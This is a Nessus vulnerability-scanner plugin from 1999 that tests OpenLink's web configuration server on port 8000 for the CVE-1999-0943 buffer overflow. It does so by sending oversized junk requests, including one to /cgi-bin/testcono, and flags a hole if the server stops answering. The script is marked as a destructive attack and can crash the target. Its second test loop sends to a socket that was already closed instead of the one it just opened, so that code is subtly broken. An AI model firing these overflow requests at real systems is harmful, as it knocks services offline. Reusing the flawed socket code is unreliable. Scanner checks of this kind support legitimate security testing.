#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10169);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-1999-0943");
 name["english"] = "OpenLink web config buffer overflow";
 name["francais"] = "Dépassement de buffer dans la config web de OpenLink";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to make the remote server execute
arbitrary code by sending one of these two URLs :

	GET AAA[....]AAA
	GET /cgi-bin/testcono?AAAAA[...]AAA HTTP/1.0
	
Solution : Upgrade.
Risk factor : High";

 desc["francais"] = "Il est possible de faire executer du code arbitraire
au serveur en lui envoyant une des requêtes :

	GET AAAA[...]AAA
	GET /cgi-bin/testcono?AAAAA[...]AAA HTTP/1.0


Solution : Mettez le à jour.
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "OpenLink buffer overflow";
 summary["francais"] = "Dépassement de buffer dans OpenLink";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports(8000);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");


port = 8000;
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 
 data = http_get(item:crap(4096), port:port);
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:data);
  b = recv_line(socket:soc, length:1024);
  http_close_socket(soc);
  if(!b){
  	security_hole(port);
	exit(0);
	}
 } 
 else exit(0);
 
 foreach dir (cgi_dirs())
 {
 soc2 = http_open_socket(port);
 if(soc2)
  {
  data = http_get(item:string(dir, "/testcono?", crap(2000)), port:port);
  send(socket:soc, data:data);
  c = recv_line(socket:soc, length:1024);
  http_close_socket(soc);
  if(!strlen(c)){
  	security_hole(port);
	exit(0);
	}
  }
 }
}
